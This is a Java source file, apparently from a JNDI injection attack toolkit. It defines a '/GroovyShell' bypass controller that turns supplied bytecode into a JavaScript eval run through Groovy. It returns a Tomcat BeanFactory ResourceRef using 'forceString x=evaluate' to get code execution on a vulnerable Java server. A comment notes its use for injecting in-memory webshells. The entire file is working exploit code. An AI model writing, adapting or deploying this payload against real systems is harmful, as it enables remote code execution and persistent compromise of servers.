package cn.butler.jndi.controller.bypass;

import cn.butler.jndi.annotation.JNDIController;
import cn.butler.jndi.annotation.JNDIMapping;
import cn.butler.jndi.controller.BasicController;
import cn.butler.thirdparty.payloads.expression.JSExpression;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/GroovyShell")
public class GroovyShellController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        //Groovy下调用JS代码注内存马有些问题，所以没有直接用JSExpression的代码
        String code = JSExpression.unsafeExpressModify(byteCode);

        String script = "Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\");";
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", script));
        return ref;
    }
}
